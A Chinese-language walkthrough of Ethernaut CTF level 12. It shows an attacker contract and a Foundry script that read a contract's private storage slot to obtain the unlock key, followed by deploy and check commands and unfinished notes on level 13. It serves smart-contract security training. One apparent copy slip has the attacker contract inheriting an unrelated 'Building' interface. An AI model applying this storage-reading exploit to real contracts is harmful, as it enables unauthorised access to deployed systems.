# Level 12

[The Ethernaut level 12](https://ethernaut.openzeppelin.com/level/12)

这一关的要求是解锁 `Privacy` 合约。

仔细阅读这个合约，解锁 `Privacy` 合约的方式是调用 `unlock` 方法并输入正确的 `_key`。`_key` 值从合约的存储值 `data` 而来。因此，该挑战其实考的是合约的存储布局。

`Privacy` 合约中变量的存储布局：

- `bool public locked` 存储在槽 `0`。
- `uint256 public ID` 存储在槽 `1`。
- `uint8 private flattening`、`uint8 private denomination` 和 `uint16 private awkwardness` 会紧凑地存储在槽 `2`（因为它们总共占 32 位）。
- `bytes32[3] private data` 是一个静态大小的数组，所以它会在存储槽 `3` 开始连续存储，其每个元素占用一个存储槽（即槽 `3`、槽 `4`、槽 `5`）


因此，可以通过 Foundry 的作弊码读取存储槽 `5` 的值，就可以顺利解锁 `Privacy` 合约。

示例代码如下：

```
contract Attacker is Building {
    Privacy level;

    constructor(address level_) {
        level = Privacy(level_);
    }

    function attack(bytes16 _key) public {
        level.unlock(_key);
    }
}
```

还需要一个脚本去部署 `Attacker` 合约并发起攻击，其中读取合约存储槽 `5` 的值

```
address levelAddr = 0x477C9b8Afa15DcF950fbAeEd391170C0eb0534C3;

Attacker attacker = new Attacker(levelAddr);

uint256 levelDataSlotStartIdx = 3;

bytes32 dataInPos2 = vm.load(
    levelAddr,
    bytes32(levelDataSlotStartIdx + 2)
);

bytes16 _key = bytes16(dataInPos2);

attacker.attack(_key);
```

完整代码见：[这里](../../ethernaut/script/level12.s.sol)

Foundry 脚本：

调用脚本部署并发动攻击：
```
forge script script/level12.s.sol:CallContractScript --rpc-url sepolia --broadcast
```

查询是否已解锁
```
cast call 0x477C9b8Afa15DcF950fbAeEd391170C0eb0534C3 \
"locked()(bool)" \
--rpc-url sepolia
```


链上记录：
- [level(`Privacy`)](https://sepolia.etherscan.io/address/0x477C9b8Afa15DcF950fbAeEd391170C0eb0534C3)
- [Attacker](https://sepolia.etherscan.io/tx/0x160FeC247F3578DF771333FB5108352434AE3fAE)
- [attack 交易](https://sepolia.etherscan.io/tx/0xd97d0d2933a94cc266086631dd13d9932a896f928d75616c86e5dbde9b25ce28)



[The Ethernaut level 13](https://ethernaut.openzeppelin.com/level/13)

这一关的要求是通过三个守门员。
- gateOne：msg.sender 和 tx.origin 不想等，这个很容易实现：通过部署一个中间合约去调用。
- gateTwo：要求剩余 gas 为 8191 的整数倍，这个得暴力破解
- gateThres：设计多个转换转换

ps：脚本还在测试中